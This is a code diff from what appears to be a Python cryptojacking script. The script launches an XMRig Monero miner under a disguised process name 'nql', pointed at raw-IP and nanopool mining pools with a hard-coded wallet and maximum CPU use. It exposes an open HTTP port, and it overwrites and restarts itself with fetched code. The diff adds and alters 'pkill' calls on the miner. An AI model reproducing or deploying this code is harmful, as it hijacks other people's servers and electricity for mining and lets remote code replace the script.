@@ -41,6 +41,9 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
+
+xmrig_name = 'nql'
+os.system('pkill %s' % xmrig_name)
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.vps_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
 #command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 command_xmrig_default = '--algo randomx -o 45.8.146.102:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
@@ -77,7 +80,7 @@ while True:
                     fileopen = open(path_app, 'w+')
                     fileopen.write(data_trave)
                     fileopen.close()
-                    os.system('pkill -9 %s' % xmrig_name)
+                    os.system('pkill %s' % xmrig_name)
                     os.system('python3 %s' % path_app)
                     sys.exit()
     except:
